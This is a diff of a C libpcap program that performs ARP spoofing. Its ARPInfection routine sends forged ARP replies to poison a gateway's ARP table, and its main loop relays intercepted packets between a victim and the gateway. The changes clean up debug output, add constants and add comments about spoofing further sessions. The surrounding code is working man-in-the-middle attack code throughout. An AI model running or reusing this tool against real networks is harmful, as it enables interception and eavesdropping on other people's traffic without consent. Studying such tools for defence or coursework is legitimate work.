@@ -23,9 +23,12 @@
 //IP Header
 #define IP_ADDR_SIZE 	4
 
+#define ETHER_HEADER_SIZE 14
+
 #define ARP_REQEST 		0
 #define ARP_REPLY		1
 
+#define PIPE_BUF_SIZE 18
 
 //gcc -o pcap pcap.c -lpcap
 typedef struct Ethernet_Header {
@@ -114,7 +117,7 @@ int gw_IP_Parsing (unsigned char * gw_IP) {
 
 	else {		
 		close(arp_pipe[1]);		// close for-write fd
-		read(arp_pipe[0], pipe_buf, 18);
+		read(arp_pipe[0], pipe_buf, PIPE_BUF_SIZE);
 		close(arp_pipe[0]);		
 		printf("gateway IP : %s", pipe_buf);
 		
@@ -149,7 +152,7 @@ int own_IP_Parsing(const unsigned char * own_IP) {
 
 	else {
 		close(arp_pipe[1]);		// close for-write fd
-		read(arp_pipe[0], pipe_buf, 18);
+		read(arp_pipe[0], pipe_buf, PIPE_BUF_SIZE);
 		close(arp_pipe[0]);
 
 		
@@ -163,8 +166,6 @@ int own_IP_Parsing(const unsigned char * own_IP) {
 int own_MAC_Parsing (const unsigned char * own_MACaddr) {
 	unsigned char pipe_buf[1024];
 	int arp_pipe[2];
-	unsigned char temp;
-	unsigned char tempMAC[17];
 	pid_t pid;
 	int i = 0;
 
@@ -186,7 +187,7 @@ int own_MAC_Parsing (const unsigned char * own_MACaddr) {
 	else {
 		close(arp_pipe[1]);		// close for-write fd
 		
-		read(arp_pipe[0], pipe_buf, 18);
+		read(arp_pipe[0], pipe_buf, PIPE_BUF_SIZE);
 
 	
 		ether_aton_r(pipe_buf, (struct in_addr *)own_MACaddr);
@@ -296,9 +297,7 @@ int ARPInfection (pcap_t * pcd, InfectionList * victimlist, NetInfo * own, NetIn
 		//Infect gw's arp table
 		Make_ARP_Packet(arp_packet, own->MACaddr, victimlist->victim[i].IPaddr, gw->MACaddr, gw->IPaddr, ARP_REPLY);
 		pcap_sendpacket(pcd, arp_packet, sizeof(arp_packet));
-	
 	}
-
 	return 0;
 }
 
@@ -325,7 +324,7 @@ int main (int argc, char * argv[]) {
 	unsigned char arp_packet_victim[42];
 	struct pcap_pkthdr header;
 	struct bpf_program fp;
-	InfectionList victimlist = {0, };
+	InfectionList victimlist = {0, };	//Later, for creating many sessions
 	int temp = 0;
 
 	if (argc < 2) {
@@ -397,7 +396,7 @@ int main (int argc, char * argv[]) {
 		}
 	}	
 
-
+	//Later, for making another session spoofing, array has been used..
 	memcpy(victimlist.victim[0].IPaddr, victim.IPaddr, 4);
 	memcpy(victimlist.victim[0].MACaddr, victim.MACaddr, 6);
 	victimlist.count++;
@@ -444,24 +443,15 @@ int main (int argc, char * argv[]) {
 
 	else {
 		while (1) {
-			
-			//printf("Sending ARP REPLY\n");
-			//ARPInfection (pcd, &victimlist, &own, &gw); //not yet gw...
-			
-			//printf("captured packet\n");
-
 
 			packet = pcap_next(pcd, &header);
 			if (packet == NULL)
 				continue;
 
-//			PrintPacket((unsigned char *)packet, header.len);
-
-			//Parsing the 
 			curAddr = (unsigned char *)packet;
 
 			Ethernet_Header_Parsing (curAddr, &ethheader);
-			curAddr += 14;
+			curAddr += ETHER_HEADER_SIZE;
 				
 			if (ntohs(*((unsigned short *)ethheader.type)) != 0x0800)
 				continue;
@@ -470,8 +460,6 @@ int main (int argc, char * argv[]) {
 		
 			if (memcmp(IPheader.dstIPaddr, own.IPaddr, 4) && !memcmp(ethheader.dstMACaddr, own.MACaddr, 6)){ 
 				printf("*****PACKET INFO*****\n");
-
-				//printf("src IP address : ");
 				
 				printf("srcIP -> dstIP : 	");
 				for (i = 0; i < 4; i++) {
@@ -479,13 +467,10 @@ int main (int argc, char * argv[]) {
 					else 		printf("%d 	->	",  IPheader.srcIPaddr[i]);	
 				}
 
-				//printf("dst IP address : ");
 				for (i = 0; i < 4; i++) {
 					if (i != 3) printf("%d.", IPheader.dstIPaddr[i]);
 					else 		printf("%d\n",  IPheader.dstIPaddr[i]);	
 				}
-
-				//PrintPacket((unsigned char *)packet, header.len);
 
 				if ( memcmp(ethheader.dstMACaddr, own.MACaddr, 6) || !memcmp(IPheader.dstIPaddr, own.IPaddr, 4) )
 					continue;
@@ -493,19 +478,6 @@ int main (int argc, char * argv[]) {
 				if (!memcmp(ethheader.srcMACaddr, gw.MACaddr, 6)) { // if src is gw
 					for (i = 0; i < victimlist.count; i++) {
 						if (!memcmp(IPheader.dstIPaddr, victimlist.victim[i].IPaddr, 4)) {
-
-							for (j = 0; j<6; j++)
-								printf("%02x ", ethheader.dstMACaddr[j]);
-							
-
-
-							printf("\n");
-							//PrintPacket((unsigned char *)packet, header.len);
-							
-							for (j = 0; j<6; j++)
-								printf("%02x ",victimlist.victim[i].MACaddr[j]);
-							printf("\n");
-
 							Packet_Relay(pcd, packet, header.len, own.MACaddr, victimlist.victim[i].MACaddr);
 							break;
 						}
@@ -513,12 +485,6 @@ int main (int argc, char * argv[]) {
 				}		
 
 				else{ //if src is victim
-					for (i = 0; i<6; i++)
-						printf("%02x ", ethheader.dstMACaddr[i]);
-					printf("\n");
-					//PrintPacket((unsigned char *)packet, header.len);
-
-
 					Packet_Relay(pcd, packet, header.len, own.MACaddr, gw.MACaddr); //relay packet to gw
 				}
 			}
